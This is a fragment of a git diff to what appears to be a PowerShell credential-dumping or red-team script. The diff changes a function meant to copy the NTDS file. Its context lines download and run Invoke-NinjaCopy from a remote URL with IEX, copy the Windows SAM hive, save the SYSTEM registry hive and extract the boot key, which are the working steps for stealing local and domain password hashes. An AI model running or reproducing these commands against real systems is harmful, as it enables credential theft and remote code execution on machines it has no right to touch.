@@ -338,7 +338,7 @@ Function sub_Credentials_CopySamFile() {
 }
 
 Function sub_Credentials_CopyNtdsFile() {
-    Install-Module -Name DSInternals
+    Install-Module -Name DSInternals -Force
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/basti1-b/scripts/master/Invoke-NinjaCopy.ps1'); Invoke-NinjaCopy -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam" -verbose
     reg SAVE HKLM\SYSTEM C:\SYS
     $key = Get-BootKey -SystemHiveFilePath C:\SYS
